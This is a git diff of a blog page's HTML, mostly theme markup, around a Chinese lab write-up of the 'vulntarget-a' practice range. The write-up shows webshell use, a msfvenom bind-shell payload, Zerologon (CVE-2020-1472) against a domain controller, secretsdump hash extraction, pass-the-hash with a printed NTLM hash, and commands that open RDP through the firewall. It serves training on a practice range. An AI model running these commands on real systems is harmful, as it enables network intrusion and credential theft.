stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>然后我们浏览器访问 <a target="_blank" rel="noopener" href="http://10.0.20.99/txx.php">http://10.0.20.99/txx.php</a> 发现一句话木马已经存在。</p>
 <h2><span id="连接蚁剑">连接蚁剑</span></h2><p>打开蚁剑，先设置代理，不然访问不到20网段。</p>
-<p><img src="/images/vulntargeta7.png" alt="vulntargeta7"></p>
+<p><img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/images/vulntargeta7.png" alt="vulntargeta7"></p>
 <p>然后连接，成功，并且是system权限。</p>
 <p>利用蚁剑我们可以上传文件，执行文件。</p>
 <h2><span id="msf木马">msf木马</span></h2><p>思路就是利用msf生成的木马，上传蚁剑，然后执行反弹得到meterpreter的shell。</p>
@@ -237,75 +64,58 @@ save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span
 <blockquote>
 <p>正向就是攻击连接受害，反向就是受害连接攻击。显然受害机没有192.168.0.0&#x2F;24的路由找不到我们的攻击机，而我们攻击机有10.0.20.0&#x2F;24的路由，就可以找到受害机。所以我们选择msf正向木马。</p>
 </blockquote>
-<pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp lport&#x3D;6666 -f exe &gt;6666.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Apache"><div class="codebox"><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">msfvenom</span> -p windows/x64/meterpreter/bind_tcp lport=<span class="number">6666</span> -f exe &gt;<span class="number">6666</span>.exe</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>生成木马，然后我们利用蚁剑把这个木马文件上传。</p>
 <p>msf打开监听：</p>
-<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;handler
-set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp
-set rHOST 10.0.20.99
-set LPORT 6666
-run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> rHOST 10.0.20.99</span><br><span class="line"><span class="built_in">set</span> LPORT 6666</span><br><span class="line">run</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
-<p><img src="/images/vulntargeta8.png" alt="vulntargeta8"></p>
+<p><img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/images/vulntargeta8.png" alt="vulntargeta8"></p>
 <p>打开蚁剑的虚拟终端，执行6666.exe文件，发现msf拿到了meterpreter。（本来这里一直得不到回应的，把win2016的防火墙关了才行</p>
 <p>至此我们拿下win2016了。</p>
-<h1><span id="win2019">win2019</span></h1><h2><span id="定位域控">定位域控</span></h2><pre class="line-numbers language-none"><code class="language-none">run post&#x2F;windows&#x2F;gather&#x2F;enum_domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h1><span id="win2019">win2019</span></h1><h2><span id="定位域控">定位域控</span></h2><div class="code-container" code-lang="Awk"><div class="codebox"><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post<span class="regexp">/windows/g</span>ather/enum_domain</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
-<p><img src="/images/vulntargeta9.png" alt="vulntargeta9"></p>
+<p><img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/images/vulntargeta9.png" alt="vulntargeta9"></p>
 <ul>
 <li>域名：vulntarget</li>
 <li>域控：win2019</li>
 <li>域控ip：10.0.10.110</li>
 </ul>
 <h2><span id="路由amp代理">路由&amp;代理</span></h2><p>这里发现了10的网段，和前面一样，先添加路由：</p>
-<pre class="line-numbers language-none"><code class="language-none">run post&#x2F;multi&#x2F;manage&#x2F;autoroute	#添加路由
-run autoroute -p	#查看路由<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Dockerfile"><div class="codebox"><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">run</span><span class="language-bash"> post/multi/manage/autoroute	<span class="comment">#添加路由</span></span></span><br><span class="line"><span class="keyword">run</span><span class="language-bash"> autoroute -p	<span class="comment">#查看路由</span></span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>开启本地代理：</p>
-<pre class="line-numbers language-none"><code class="language-none">use auxiliary&#x2F;server&#x2F;socks_proxy
-set srvport 9999
-run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Stata"><div class="codebox"><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> auxiliary/server/socks_proxy</span><br><span class="line"><span class="keyword">set</span> srvport 9999</span><br><span class="line"><span class="keyword">run</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>然后我们使用<strong>proxychains</strong>这个工具调用nmap：</p>
-<pre class="line-numbers language-none"><code class="language-none">首先修改配置文件：
-vim &#x2F;etc&#x2F;proxychains4.conf
-最后一行修改为：socks5	127.0.0.1 9999
+<div class="code-container" code-lang="Dns"><div class="codebox"><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">首先修改配置文件：</span><br><span class="line">vim /etc/proxychains4.conf</span><br><span class="line">最后一行修改为：socks<span class="number">5	127.0.0</span>.<span class="number">1</span> <span class="number">9999</span></span><br><span class="line"></span><br><span class="line">调用nmap：</span><br><span class="line">proxychains4 nmap -Pn -sT <span class="number">10.0.10.110</span> -p63<span class="number">79,80,8080</span>,<span class="number">445,139</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
-调用nmap：
-proxychains4 nmap -Pn -sT 10.0.10.110 -p6379,80,8080,445,139<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="/images/vulntargeta10.png" alt="vulntargeta10"></p>
+<p><img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/images/vulntargeta10.png" alt="vulntargeta10"></p>
 <h2><span id="cve-2020-1472">CVE-2020-1472</span></h2><p>直接使用<code>CVE-2020-1472</code>（域内提权）</p>
 <p>exp：<a target="_blank" rel="noopener" href="https://github.com/dirkjanm/CVE-2020-1472">https://github.com/dirkjanm/CVE-2020-1472</a> </p>
-<pre class="line-numbers language-none"><code class="language-none">proxychains python3 cve-2020-1472-exploit.py 域控主机名 域控IP
-proxychains python3 cve-2020-1472-exploit.py win2019 10.0.10.110<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Apache"><div class="codebox"><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">proxychains</span> python3 cve-<span class="number">2020</span>-<span class="number">1472</span>-exploit.py 域控主机名 域控IP</span><br><span class="line"><span class="attribute">proxychains</span> python3 cve-<span class="number">2020</span>-<span class="number">1472</span>-exploit.py win2019 <span class="number">10.0.10.110</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p> 此时密码已经置空</p>
 <h2><span id="impacte获取hash">impacte获取hash</span></h2><p>下载：</p>
-<pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;SecureAuthCorp&#x2F;impacket.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Awk"><div class="codebox"><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/SecureAuthCorp/im</span>packet.git</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>再使用impactet来进行下一步的操作，获取域控hash</p>
 <p>cd到example目录下：</p>
-<pre class="line-numbers language-none"><code class="language-none">proxychains4 python3 secretsdump.py vulntarget.com&#x2F;win2019\$@10.0.10.110 -no-pass<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Vim"><div class="codebox"><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 <span class="keyword">python3</span> secretsdump.<span class="keyword">py</span> vulntarget.<span class="keyword">com</span>/win2019\$@<span class="number">10.0</span>.<span class="number">10.110</span> -<span class="keyword">no</span>-pass</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
-<p><img src="/images/vulntargeta11.png" alt="vulntargeta11"></p>
+<p><img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/images/vulntargeta11.png" alt="vulntargeta11"></p>
 <blockquote>
 <p>得到administrator的hash：aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15</p>
 </blockquote>
 <p>哈希传递直接就拿下域控：</p>
-<pre class="line-numbers language-none"><code class="language-none">proxychains python3 smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15 administrator@10.0.10.110<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Llvm"><div class="codebox"><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python<span class="number">3</span> smbexec.py -hashes aad<span class="number">3</span>b<span class="number">435</span>b<span class="number">51404</span>eeaad<span class="number">3</span>b<span class="number">435</span>b<span class="number">51404</span>ee:<span class="keyword">c</span><span class="number">7</span><span class="keyword">c</span><span class="number">654</span>da<span class="number">31</span>ce<span class="number">51</span>cbeecfef<span class="number">99e637</span>be<span class="number">15</span> administrator<span class="title">@10</span>.<span class="number">0.10</span>.<span class="number">110</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
-<p><img src="/images/vulntargeta12.png" alt="vulntargeta12"></p>
+<p><img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/images/vulntargeta12.png" alt="vulntargeta12"></p>
 <h2><span id="破解hash">破解hash</span></h2><p>把Administrator:500:aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15:::写入文本文件。然后使用john破解。</p>
-<p><img src="/images/vulntargeta13.png" alt="vulntargeta13"></p>
+<p><img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/images/vulntargeta13.png" alt="vulntargeta13"></p>
 <p>得到明文密码：Admin@666</p>
 <h2><span id="3389远程登录">3389远程登录</span></h2><p>开启远程桌面，开启<code>3389</code>，防火墙放行<code>3389</code>，连接。</p>
-<pre class="line-numbers language-none"><code class="language-none">reg add &quot;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;t REG_DWORD &#x2F;v portnumber &#x2F;d 3389 &#x2F;f
-
-wmic RDTOGGLE WHERE ServerName&#x3D;&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1
-
-netsh advfirewall firewall add rule name&#x3D;&quot;Remote Desktop&quot; protocol&#x3D;TCP dir&#x3D;in localport&#x3D;3389 action&#x3D;allow<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Routeros"><div class="codebox"><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">reg <span class="built_in">add</span> <span class="string">&quot;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /t REG_DWORD /v portnumber /d 3389 /f</span><br><span class="line"></span><br><span class="line">wmic RDTOGGLE WHERE <span class="attribute">ServerName</span>=<span class="string">&#x27;%COMPUTERNAME%&#x27;</span> call SetAllowTSConnections 1</span><br><span class="line"></span><br><span class="line">netsh advfirewall<span class="built_in"> firewall </span><span class="built_in">add</span> rule <span class="attribute">name</span>=<span class="string">&quot;Remote Desktop&quot;</span> <span class="attribute">protocol</span>=TCP <span class="attribute">dir</span>=in <span class="attribute">localport</span>=3389 <span class="attribute">action</span>=allow</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>kali上就直接<code>proxychains4 rdesktop 10.0.10.110</code> </p>
 <p>账号：vulntarget.com\administrator  密码：Admin@666</p>
@@ -313,7 +123,7 @@ netsh advfirewall firewall add rule name&#x3D;&quot;Remote Desktop&quot; protoco
 <p>首先解决代理的问题，使用工具<strong>Proxifier</strong>。</p>
 <p>依次点击Profile–&gt;Proxy Servers–&gt;Add。Address：192.168.0.106，Port：9999，Protocol：socks5。然后ok就行。然后Profile–&gt;Proxification Rules，把Localhost前面的√取消。</p>
 <p>win+R输入mstsc，打开远程桌面连接，输入10.0.10.110，然后账号密码，连接成功。</p>
-<p><img src="/images/vulntargeta14.png" alt="vulntargeta14"></p>
+<p><img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/images/vulntargeta14.png" alt="vulntargeta14"></p>
 <hr>
 <p>学习链接：</p>
 <ul>
@@ -321,144 +131,115 @@ netsh advfirewall firewall add rule name&#x3D;&quot;Remote Desktop&quot; protoco
 <li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg3NDYwNjQyMw==&amp;mid=2247486539&amp;idx=1&amp;sn=fb322e30895f081a1073ccd2642b365c&amp;chksm=cecf7673f9b8ff6539b5f44aaa186619bb039ee1014ab8d4bb7873368d0fc4aae65b82d2a499&amp;scene=178&amp;cur_album_id=2109154452740866051#rd">https://mp.weixin.qq.com/s?__biz=Mzg3NDYwNjQyMw==&amp;mid=2247486539&amp;idx=1&amp;sn=fb322e30895f081a1073ccd2642b365c&amp;chksm=cecf7673f9b8ff6539b5f44aaa186619bb039ee1014ab8d4bb7873368d0fc4aae65b82d2a499&amp;scene=178&amp;cur_album_id=2109154452740866051#rd</a></li>
 </ul>
 <hr>
+</div><div class="post-reward"><div class="post-reward-btn" title="赞赏作者"><img src="/assets/images/svg/uc/uc-gift.svg" class="icon noview" alt="Icon"><span></span></div><div class="post-reward-content"><div class="post-reward-text"></div><div class="post-reward-list"><a href="/null" target="_blank">致谢名单</a></div></div></div><div class="post-copyright"><div class="post-copyright-info">本作品由 jjjing 于 2022-08-27 16:11:33 发布</div><div class="post-copyright-link"><span>作品地址：<a href="https://jinggg1123.github.io/archives/2022/08/27/vulntaget-a/">vulntarget-a打靶记录</a></span><button class="copy-text" type="button" data-text="https://jinggg1123.github.io/archives/2022/08/27/vulntaget-a/">复制</button></div><div class="post-copyright-detail">除特别声明外，本站作品均采用 <a href='https://creativecommons.org/licenses/by-nc-sa/4.0/' title='Attribution-NonCommercial-ShareAlike' target='_blank'>CC BY-NC-SA 4.0</a> 许可协议，转载请注明来自 <a href='/'>jjjing</a></div><img class="post-copyright-icon noview" src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></div><div class="post-tail-tags"></div><div class="post-nav"><a class="post-nav-prev" href="/2022/08/29/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="ctfshow_web入门_命令执行">上一篇<span>ctfshow_web入门_命令执行</span></a><a class="post-nav-next" href="/2022/08/09/ctfshowssrf/" title="ctfshow_web入门_ssrf">下一篇<span>ctfshow_web入门_ssrf</span></a></div></div><aside id="post-sidebar" status="show" active=""><div id="toc-container"><div class="toc-title"><img src="/assets/images/svg/ta/ta-toc.svg" class="icon noview" alt="Icon"><span>目录</span></div><div class="toc-content" id="toc-div"><ol class="toc-list"><li class="toc-list-item toc-list-level-1"><a class="toc-list-link"><span class="toc-list-text">拓扑结构</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link"><span class="toc-list-text">win7</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link"><span class="toc-list-text">信息搜集</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link"><span class="toc-list-text">ms17_010</span></a></li></ol></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link"><span class="toc-list-text">win2016</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link"><span class="toc-list-text">添加路由</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link"><span class="toc-list-text">开启代理</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link"><span class="toc-list-text">proxychains调用nmap</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link"><span class="toc-list-text">redis未授权漏洞</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link"><span class="toc-list-text">连接蚁剑</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link"><span class="toc-list-text">msf木马</span></a></li></ol></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link"><span class="toc-list-text">win2019</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link"><span class="toc-list-text">定位域控</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link"><span class="toc-list-text">路由&amp;代理</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link"><span class="toc-list-text">CVE-2020-1472</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link"><span class="toc-list-text">impacte获取hash</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link"><span class="toc-list-text">破解hash</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link"><span class="toc-list-text">3389远程登录</span></a></li></ol></li></ol></div></div><script>document.addEventListener('DOMContentLoaded', function () {
+  var headings = Array.from(document.querySelectorAll('.post h1, .post h2, .post h3, .post h4, .post h5, .post h6'));
+  var usedHeadings = [];
 
-  </div>
-</article>
-
-
-
-        
-          <div id="footer-post-container">
-  <div id="footer-post">
-
-    <div id="nav-footer" style="display: none">
-      <ul>
-        
-          <li><a href="/">首页</a></li>
-        
